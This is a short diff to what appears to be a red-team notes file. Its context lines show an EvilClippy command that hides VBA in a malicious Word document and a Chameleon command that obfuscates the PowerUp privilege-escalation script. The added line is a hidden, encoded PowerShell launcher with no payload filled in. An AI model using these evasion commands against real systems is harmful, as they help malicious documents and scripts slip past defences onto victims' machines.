@@ -23,3 +23,6 @@ EvilClippy.exe -s t.vba -g -d -r -u mal_doc.docm
 ```
 python .\chameleon.py -a .\PowerUp.ps1 -o .\PowerUp-obf.ps1 -z
 ```
+```
+powershell -Sta -Nop -Window Hidden -EncodedCommand 
+```
